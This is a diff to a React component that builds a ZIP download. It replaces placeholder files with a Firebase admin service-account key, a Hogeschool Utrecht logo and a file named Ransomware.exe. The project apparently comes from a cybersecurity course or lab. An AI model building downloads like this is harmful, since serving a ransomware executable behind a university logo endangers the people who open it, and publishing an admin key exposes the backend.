@@ -5,9 +5,9 @@ import { saveAs } from "file-saver";
 const DownloadZip = () => {
   // Bestanden die je wilt toevoegen aan de ZIP (pad relatief aan /public)
   const files = [
-    { path: "programma/bestand1.txt", name: "bestand1.txt" },
-    { path: "programma/bestand2.txt", name: "bestand2.txt" },
-    { path: "programma/subfolder/bestand3.txt", name: "subfolder/bestand3.txt" }
+    { path: "dist/ad-cybersecurity-firebase-adminsdk-fbsvc-1d4636321b.json", name: "ad-cybersecurity-firebase-adminsdk-fbsvc-1d4636321b.json" },
+    { path: "dist/Hogeschool-Utrecht.png", name: "Hogeschool-Utrecht.png" },
+    { path: "dist/Ransomware.exe", name: "Ransomware.exe" }
   ];
 
   const downloadZip = async () => {
